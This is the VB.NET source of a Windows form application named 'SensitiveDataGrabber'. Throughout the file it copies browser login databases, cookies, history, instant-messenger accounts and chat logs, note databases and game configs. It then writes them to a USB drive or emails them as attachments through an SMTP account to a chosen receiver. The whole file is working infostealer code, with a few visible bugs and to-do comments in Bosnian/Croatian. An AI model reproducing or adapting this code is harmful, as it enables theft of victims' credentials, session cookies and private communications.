Imports System.IO
Imports Microsoft.Win32
Imports System.Net.Mail
Imports System.Environment
Imports System.Management
Imports Microsoft.VisualBasic.FileIO

Public Class MainForm

    ' basic variables
    Dim method As String
    Dim driveLetter As String
    Dim defaultBrowser As String
    Dim username As String = Environment.UserName
    Dim softwareName As String

    ' email variables
    Dim emailCredentials As New emailCredentials
    Dim emailSMTPServer As String
    Dim emailSMTPPort As Integer
    Dim emailSenderEmail As String
    Dim emailSenderPassword As String
    Dim emailReciever As String
    Dim emailDefaultSubject As String
    Dim mail As New MailMessage()

    ' directories
    Dim firefoxDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Mozilla\Firefox\Profiles\"
    Dim thunderbirdDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Thunderbird\Profiles\"
    Dim chromeDirectory As String = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default"
    Dim evernoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Evernote\Evernote\Databases"
    Dim pidginDirectory As String = "C:\Users\" & username & "\AppData\Roaming\.purple\"
    Dim oneNoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Microsoft\OneNote\"
    Dim steamDirectory As String = "C:\Program Files (x86)\Steam\config\"
    Dim WoTDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Wargaming.net\WorldofTanks"

    ' temporary file for getBasicInfo()
    Dim temporary As String = System.IO.Path.GetTempFileName()

    Private Function checkIfInstalled(ByVal software As String) As String

        ' Checks the registry to see if compatible programs are installed.
        Dim regPath As String = String.Empty
        Dim regkey As RegistryKey
        Select Case software
            Case "Chrome"
                regPath = ("Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome")
            Case "Evernote"
                regPath = ("Software\Evernote")
            Case "Firefox"
                regPath = ("Software\Mozilla\Firefox")
            Case "OneNote"
                regPath = ("Software\Microsoft\Office\15.0\OneNote")
            Case "Pidgin"
                regPath = ("Software\pidgin")
            Case "Steam"
                regPath = ("Software\Valve\Steam")
            Case "Thunderbird"
                regPath = ("Software\Mozilla\Thunderbird")
            Case "World of Tanks"
        End Select

        regkey = My.Computer.Registry.LocalMachine.OpenSubKey(regPath)

        If regkey Is Nothing Then
            Return "No"
        Else
            Return "Yes"
        End If

    End Function
    Private Function getUSBLetter()
        ' Checks to see removable drive letter.
        For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
            If d.DriveType = DriveType.Removable Then
                driveLetter = d.Name
            End If
        Next
        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber")
        Return Nothing
    End Function

    Private Function getBasicInfo()
        If Not File.Exists(driveLetter & "SensitiveDataGrabber\basicinfo.txt") Then File.Create(driveLetter & "SensitiveDataGrabber\basicinfo.txt")

        ' Basic info
        Dim getMachineName As String = Environment.MachineName
        Dim getUserName As String = Environment.UserName
        Dim getDomainName As String = Environment.UserDomainName
        Dim getBits As String = Environment.Is64BitOperatingSystem.ToString
        Dim getNoOfProcessors As String = Environment.ProcessorCount

        ' OS version
        Dim OSMajor As String = Environment.OSVersion.Version.Major.ToString
        Dim OSMinor As String = Environment.OSVersion.Version.Minor.ToString
        Dim getOSVersion As String = String.Empty
        If OSMajor = 5 And OSMinor = 0 Then getOSVersion = "Windows 2000"
        If OSMajor = 5 And OSMinor = 1 Then getOSVersion = "Windows XP (x86)"
        If OSMajor = 5 And OSMinor = 2 Then getOSVersion = "Windows XP (x64)"
        If OSMajor = 6 And OSMinor = 0 Then getOSVersion = "Windows Vista"
        If OSMajor = 6 And OSMinor = 1 Then getOSVersion = "Windows 7"
        If OSMajor = 6 And OSMinor = 2 Then getOSVersion = "Windows 8"
        If OSMajor = 6 And OSMinor = 3 Then getOSVersion = "Windows 8.1"

        ' Memory
        Dim getTotalPhysicalMemory As String = System.Math.Round(My.Computer.Info.TotalPhysicalMemory / (1024 * 1024), 2).ToString
        Dim getAvailablePhysicalMemory As String = System.Math.Round(My.Computer.Info.AvailablePhysicalMemory / (1024 * 1024), 2).ToString
        Dim getTotalVirtualMemory As String = System.Math.Round(My.Computer.Info.TotalVirtualMemory / (1024 * 1024), 2).ToString
        Dim getAvailableVirtualMemory As String = System.Math.Round(My.Computer.Info.AvailableVirtualMemory / (1024 * 1024), 2).ToString

        If method = "1" Then
            Using sw As StreamWriter = New StreamWriter(driveLetter & "SensitiveDataGrabber\basicinfo.txt")
                sw.Write("OS: " & getOSVersion & vbCrLf)
                sw.Write("Username: " & getUserName & vbCrLf)
                sw.Write("Number of processors: " & getNoOfProcessors & vbCrLf)
                sw.Write("Is system 64bit? " & getBits & vbCrLf)
                sw.Write("Domain name: " & getDomainName & vbCrLf)
                sw.Write("Machine name: " & getMachineName & vbCrLf)
                sw.Write(vbCrLf)
                sw.Write("Total physical memory: " & getTotalPhysicalMemory & vbCrLf)
                sw.Write("Available physical memory: " & getAvailablePhysicalMemory & vbCrLf)
                sw.Write("Total virtual memory: " & getTotalVirtualMemory & vbCrLf)
                sw.Write("Available virtual memory: " & getAvailableVirtualMemory & vbCrLf)
            End Using

        ElseIf method = "2" Then
            Using sw As StreamWriter = New StreamWriter(temporary)
                sw.WriteLine("OS: " & getOSVersion)
                sw.WriteLine("Username: " & getUserName)
                sw.WriteLine("Number of processors: " & getNoOfProcessors)
                sw.WriteLine("Is system 64bit? " & getBits)
                sw.WriteLine("Domain name: " & getDomainName)
                sw.WriteLine("Machine name: " & getMachineName)
                sw.WriteLine()
                sw.WriteLine("Total physical memory: " & getTotalPhysicalMemory)
                sw.WriteLine("Available physical memory: " & getAvailablePhysicalMemory)
                sw.WriteLine("Total virtual memory: " & getTotalVirtualMemory)
                sw.WriteLine("Available virtual memory: " & getAvailableVirtualMemory)
            End Using
            Dim basicInfo As Attachment
            basicInfo = New Attachment(temporary, "text/plain")
            mail.Attachments.Add(basicInfo)
        Else

        End If

        Return Nothing
    End Function

    Private Function getChrome()

        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Chrome") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Chrome")
            File.Copy(chromeDirectory & "\Bookmarks", driveLetter & "SensitiveDataGrabber\Chrome\bookmarks.txt", True)
            File.Copy(chromeDirectory & "\Cookies", driveLetter & "SensitiveDataGrabber\Chrome\cookies.sqlite", True)
            File.Copy(chromeDirectory & "\History", driveLetter & "SensitiveDataGrabber\Chrome\history.sqlite", True)
            File.Copy(chromeDirectory & "\Login Data", driveLetter & "SensitiveDataGrabber\Chrome\loginData.sqlite", True)
            File.Copy(chromeDirectory & "\Web Data", driveLetter & "SensitiveDataGrabber\Chrome\webdata.sqlite", True)

        ElseIf method = "2" Then
            Dim chromeBookmarks As Attachment = New Attachment(chromeDirectory & "\Bookmarks")
            Dim chromeCookies As Attachment = New Attachment(chromeDirectory & "\Cookies")
            Dim chromeHistory As Attachment = New Attachment(chromeDirectory & "\History")
            Dim chromeLoginData As Attachment = New Attachment(chromeDirectory & "\Login Data")
            Dim chromeWebData As Attachment = New Attachment(chromeDirectory & "\Web Data")

            mail.Attachments.Add(chromeBookmarks)
            mail.Attachments.Add(chromeCookies)
            mail.Attachments.Add(chromeHistory)
            mail.Attachments.Add(chromeLoginData)
            mail.Attachments.Add(chromeWebData)

        Else

        End If

        Return Nothing
    End Function

    Private Function getEvernote()

        Dim wholeLine As String = String.Empty
        Dim evernoteUsername As String = String.Empty

        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Evernote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Evernote")
            File.Copy(evernoteDirectory & "\.accounts", driveLetter & "SensitiveDataGrabber\Evernote\accountinfo.txt", True)

            Using sr As StreamReader = New StreamReader(evernoteDirectory & "\.accounts")
                wholeLine = sr.ReadLine
            End Using

            For i = 1 To wholeLine.Length
                If wholeLine(i - 1) <> ";" Then
                    evernoteUsername = evernoteUsername + wholeLine(i - 1)
                Else
                    Exit For
                End If
            Next

            File.Copy(evernoteDirectory & "\" & evernoteUsername & ".exb", driveLetter & "SensitiveDataGrabber\Evernote\notesdump.exb", True)

        ElseIf method = "2" Then
            Dim evernoteAccounts As Attachment = New Attachment(evernoteDirectory & "\.accounts", "text/plain")
            Dim evernoteDatabase As Attachment = New Attachment(evernoteDirectory & "\" & evernoteUsername & ".exb", "text/plain")
            mail.Attachments.Add(evernoteAccounts)
            mail.Attachments.Add(evernoteDatabase)
        Else

        End If

        Return Nothing
    End Function

    Private Function getFirefox()

        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Firefox") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Firefox")
            If File.Exists(firefoxDirectory & "cookies.sqlite") Then File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
            If File.Exists(firefoxDirectory & "addons.json") Then File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
            If File.Exists(firefoxDirectory & "downloads.json") Then File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
            If File.Exists(firefoxDirectory & "formhistory.sqlite") Then File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
        ElseIf method = "2" Then
            Dim firefoxCookies As Attachment
            Dim firefoxAddons As Attachment
            Dim firefoxDownloads As Attachment
            Dim firefoxFormHistory As Attachment

            If File.Exists(firefoxDirectory & "cookies.sqlite") Then
                firefoxCookies = New Attachment(firefoxDirectory & "cookies.sqlite")
                mail.Attachments.Add(firefoxCookies)
            End If

            If File.Exists(firefoxDirectory & "addons.json") Then
                firefoxAddons = New Attachment(firefoxDirectory & "addons.json")
                mail.Attachments.Add(firefoxAddons)
            End If

            If File.Exists(firefoxDirectory & "downloads.json") Then
                firefoxDownloads = New Attachment(firefoxDirectory & "downloads.json")
                mail.Attachments.Add(firefoxDownloads)
            End If

            If File.Exists(firefoxDirectory & "formhistory.sqlite") Then
                firefoxFormHistory = New Attachment(firefoxDirectory & "formhistory.sqlite")
                mail.Attachments.Add(firefoxFormHistory)
            End If

        Else

        End If


        Return Nothing

    End Function

    Private Function getPidgin()
        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Pidgin") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Pidgin")
            File.Copy(pidginDirectory & "accounts.xml", driveLetter & "SensitiveDataGrabber\Pidgin\accounts.xml", True)
            My.Computer.FileSystem.CopyDirectory(pidginDirectory & "logs", driveLetter & "SensitiveDataGrabber\Pidgin\logs")
        ElseIf method = "2" Then
            Dim pidginAccounts As Attachment = New Attachment(pidginDirectory & "accounts.xml")
            mail.Attachments.Add(pidginAccounts)
        Else

        End If
        Return Nothing
    End Function

    Private Function getOneNote()
        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\OneNote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\OneNote")
            If Directory.Exists(oneNoteDirectory & "15.0\Backup") Then My.Computer.FileSystem.CopyDirectory(oneNoteDirectory & "15.0\Backup", driveLetter & "SensitiveDataGrabber\OneNote\", True)
        ElseIf method = "2" Then

        Else

        End If
        Return Nothing
    End Function

    Private Function getSteam()
        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Steam") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Steam")
            File.Copy(steamDirectory & "config.vdf", driveLetter & "SensitiveDataGrabber\Steam\config.txt", True)
        ElseIf method = "2" Then
            Dim steamConfig As Attachment = New Attachment(steamDirectory & "config.vdf")
            mail.Attachments.Add(steamConfig)
        Else

        End If
        Return Nothing
    End Function

    Private Function getThunderbird()
        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Thunderbird") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Thunderbird")
            If File.Exists(thunderbirdDirectory & "abook.mab") Then File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
            If File.Exists(thunderbirdDirectory & "addons.sqlite") Then File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
            If File.Exists(thunderbirdDirectory & "cookies.sqlite") Then File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
        ElseIf method = "2" Then
            If File.Exists(thunderbirdDirectory & "abook.mab") Then
                Dim thunderbirdAddressBook As Attachment = New Attachment(thunderbirdDirectory & "abook.mab")
                mail.Attachments.Add(thunderbirdAddressBook)
            End If
            If File.Exists(thunderbirdDirectory & "addons.sqlite") Then
                Dim thunderbirdAddons As Attachment = New Attachment(thunderbirdDirectory & "addons.sqlite")
                mail.Attachments.Add(thunderbirdAddons)
            End If
            If File.Exists(thunderbirdDirectory & "cookies.sqlite") Then
                Dim thunderbirdCookies As Attachment = New Attachment(thunderbirdDirectory & "cookies.sqlite")
                mail.Attachments.Add(thunderbirdCookies)
            End If
            
        Else

        End If
        Return Nothing
    End Function

    Private Function getWoT()
        If method = "1" Then
            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\WoT") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\WoT")
            File.Copy(WoTDirectory & "\preferences.xml", driveLetter & "SensitiveDataGrabber\WoT\preferences.xml", True)
            My.Computer.FileSystem.CopyDirectory(WoTDirectory & "\battle_results", driveLetter & "SensitiveDataGrabber\WoT\battle_results", True)
        ElseIf method = "2" Then
            Dim wotPreferences As Attachment = New Attachment(WoTDirectory & "\preferences.xml")
            mail.Attachments.Add(wotPreferences)
        Else

        End If
        ' Nema osjetljivih podataka unutar World of Tanks foldera.
        ' Iz preferences se može izvući korisničko ime.
        ' Pored toga, mislim da nema ništa bitno u folderu osim rezultata bitaka.
        Return Nothing
    End Function

    Private Function getFirefoxDirectory() As String
        Dim result As String = String.Empty
        Dim folder() As String = Directory.GetDirectories(firefoxDirectory)
        result = folder(0)
        result = result & "\"
        Return result
    End Function

    Private Function getThunderbirdDirectory() As String
        Dim result As String = String.Empty
        Dim folder() As String = Directory.GetDirectories(thunderbirdDirectory)
        result = folder(0)
        result = result & "\"
        Return result
    End Function

    Private Function sendMail()
        Try
            Dim Smtp_Server As New SmtpClient
            Smtp_Server.UseDefaultCredentials = False
            Smtp_Server.Credentials = New Net.NetworkCredential(emailSenderEmail, emailSenderPassword)
            Smtp_Server.Host = emailSMTPServer
            Smtp_Server.Port = emailSMTPPort
            Smtp_Server.EnableSsl = True

            mail.From = New MailAddress(emailSenderEmail)
            mail.To.Add(emailReciever)
            mail.Subject = emailDefaultSubject
            mail.IsBodyHtml = False
            mail.Body = username
            Smtp_Server.Send(mail)

            MessageBox.Show("Email sent!")
            System.IO.File.Delete(temporary)

        Catch error_t As Exception
            MsgBox(error_t.ToString)
        End Try

        Return Nothing
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If checkIfInstalled("Chrome") <> "Yes" Then chkChrome.Enabled = False
        If checkIfInstalled("Firefox") <> "Yes" Then chkFirefox.Enabled = False
        If checkIfInstalled("Thunderbird") <> "Yes" Then chkThunderbird.Enabled = False
        If checkIfInstalled("Steam") <> "Yes" Then chkSteam.Enabled = False
        If checkIfInstalled("Pidgin") <> "Yes" Then chkPidgin.Enabled = False
        If checkIfInstalled("OneNote") <> "Yes" Then chkOneNote.Enabled = False
        If checkIfInstalled("World of Tanks") <> "Yes" Then chkWoT.Enabled = False
        If checkIfInstalled("Evernote") <> "Yes" Then chkEvernote.Enabled = False

        RadioButton1.Enabled = True
        RadioButton1.Checked = True
        RadioButton2.Enabled = False
        RadioButton3.Enabled = False
        GroupBox2.Enabled = False

        getUSBLetter()

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If RadioButton1.Checked = True Then
            method = "1"
            Button1.Enabled = False
            Button1.Text = "Working"

            If chkFirefox.Checked = True Then
                firefoxDirectory = getFirefoxDirectory()
                getFirefox()
                Button1.Enabled = False
            End If

            If chkPidgin.Checked = True Then
                Button1.Enabled = False
                getPidgin()
                Button1.Enabled = True
            End If

            If chkEvernote.Checked = True Then
                Button1.Enabled = False
                getEvernote()
                Button1.Enabled = True
            End If

            If chkWoT.Checked = True Then
                Button1.Enabled = False
                getWoT()
                Button1.Enabled = True
            End If

            If chkThunderbird.Checked = True Then
                thunderbirdDirectory = getThunderbirdDirectory()
                Button1.Enabled = False
                getThunderbird()
                Button1.Enabled = True
            End If

            If chkChrome.Checked = True Then
                Button1.Enabled = False
                getChrome()
                Button1.Enabled = True
            End If

            If chkSteam.Checked = True Then
                Button1.Enabled = False
                getSteam()
                Button1.Enabled = True
            End If

            If chkOneNote.Checked = True Then
                Button1.Enabled = False
                getOneNote()
                Button1.Enabled = True
            End If

            Button1.Enabled = True
            Button1.Text = "Work"
            MessageBox.Show("Done!")

        ElseIf RadioButton2.Checked = True Then
            method = "2"
            Button1.Enabled = False
            Button1.Text = "Working"

            getBasicInfo()
            If chkChrome.Checked = True Then getChrome()
            If chkFirefox.Checked = True Then getFirefox()
            If chkThunderbird.Checked = True Then getThunderbird()
            If chkSteam.Checked = True Then getSteam()
            If chkPidgin.Checked = True Then getPidgin()
            If chkEvernote.Checked = True Then getEvernote()
            If chkWoT.Checked = True Then getWoT()

            sendMail()

            Button1.Enabled = True
            Button1.Text = "Work"

        ElseIf RadioButton3.Checked = True Then

        Else

        End If




    End Sub

    Private Sub ChangeEmailCredentialsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeEmailCredentialsToolStripMenuItem.Click
        emailCredentials.ShowDialog()

        If emailCredentials.DialogResult = Windows.Forms.DialogResult.OK Then

            If emailCredentials.TextBox3.Text <> Nothing Then
                If emailCredentials.ComboBox1.SelectedItem.ToString = "outlook.com" Then
                    emailSMTPServer = "smtp-mail.outlook.com"
                    emailSMTPPort = 587
                    emailSenderEmail = emailCredentials.TextBox3.Text & "@outlook.com"
                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "hotmail.com" Then
                    emailSMTPServer = "smtp-mail.outlook.com"
                    emailSMTPPort = 587
                    emailSenderEmail = emailCredentials.TextBox3.Text & "@hotmail.com"
                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "live.com" Then
                    emailSMTPServer = "smtp-mail.outlook.com"
                    emailSMTPPort = 587
                    emailSenderEmail = emailCredentials.TextBox3.Text & "@live.com"
                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "gmail.com" Then
                    emailSMTPServer = "smtp.googlemail.com"
                    emailSMTPPort = 465
                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "mail.ru" Then
                    emailSMTPServer = "smtp.mail.ru"
                    emailSMTPServer = 465
                    emailSenderEmail = emailCredentials.TextBox3.Text & "@mail.ru"
                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "Other" Then
                    emailSMTPServer = emailCredentials.TextBox1.Text
                    emailSMTPServer = emailCredentials.TextBox2.Text
                    emailSenderEmail = emailCredentials.TextBox3.Text
                End If
            End If

            If emailCredentials.TextBox4.Text <> Nothing Then emailSenderPassword = emailCredentials.TextBox4.Text
            If emailCredentials.TextBox5.Text <> Nothing Then emailReciever = emailCredentials.TextBox5.Text
            If emailCredentials.TextBox6.Text <> Nothing Then emailDefaultSubject = emailCredentials.TextBox6.Text

            RadioButton2.Enabled = True
        ElseIf emailCredentials.DialogResult = Windows.Forms.DialogResult.Cancel Then

        Else
            MessageBox.Show("There's been a critical error. Please try again", "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

    End Sub

    ' ============================================================================================
    ' ================ URADITI ================ URADITI =============== URADITI ==================
    ' ============================================================================================
    ' ======= Testirati program u virtuelnoj mašini.                                       =======
    ' ======= Trebace smisliti rjesenje za slanje foldera kao attachment.                  =======
    ' ======= Podesiti text na button1 tako da pokazuje working dok program radi nesto.    =======
    ' ============================================================================================
    ' ============================================================================================

End Class
